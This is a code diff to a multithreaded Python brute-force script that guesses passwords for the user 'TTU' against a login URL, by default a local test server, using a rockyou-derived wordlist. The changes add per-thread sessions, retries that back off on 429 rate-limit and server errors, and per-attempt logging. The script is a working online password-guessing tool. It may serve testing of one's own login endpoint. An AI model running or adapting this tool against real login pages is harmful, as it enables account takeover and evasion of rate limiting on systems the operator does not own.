@@ -4,6 +4,7 @@ import requests
 import time
 import threading
 from concurrent.futures import ThreadPoolExecutor
+from requests.adapters import HTTPAdapter, Retry
 
 URL = URL = os.getenv("BRUTE_FORCE_URL", "http://127.0.0.1:5000/login")
 WORDLIST_PATH = os.getenv("BRUTE_FORCE_WORDLIST", "short_rock_you.txt")
@@ -11,9 +12,29 @@ THREADS = int(os.getenv("BRUTE_FORCE_THREADS", "10"))
 FOUND = False
 FOUND_PASSWORD = None
 
-# Use a session for connection pooling
-session = requests.Session()
+thread_local = threading.local()
 lock = threading.Lock()
+
+retry_strategy = Retry(
+    total=3,
+    connect=3,
+    read=3,
+    status=3,
+    status_forcelist=[429, 500, 502, 503, 504],
+    allowed_methods=["HEAD", "GET", "OPTIONS", "POST"],
+    backoff_factor=1,
+)
+
+adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=THREADS, pool_maxsize=THREADS)
+
+def get_session():
+    if not hasattr(thread_local, 'session'):
+        session = requests.Session()
+        session.headers.update({'Connection': 'close'})
+        session.mount("http://", adapter)
+        session.mount("https://", adapter)
+        thread_local.session = session
+    return thread_local.session
 
 def is_success_response(response):
     try:
@@ -42,6 +63,7 @@ def attempt_password(password):
     payload = {"username": "TTU", "password": password}
     
     try:
+        session = get_session()
         response = session.post(URL, json=payload, timeout=10)
         if is_success_response(response):
             with lock:
@@ -49,8 +71,12 @@ def attempt_password(password):
                     FOUND = True
                     FOUND_PASSWORD = password
             print(f"\n[+] SUCCESS! Password found: {password}")
+        else:
+            print(f"[-] Tried {password}: status={response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"[!] request failed for {password}: {type(e).__name__}: {e}")
     except Exception as e:
-        print(f"[!] request failed for {password}: {e}")
+        print(f"[!] unexpected error for {password}: {type(e).__name__}: {e}")
 
 def run_test(target_url=None):
     global URL, FOUND
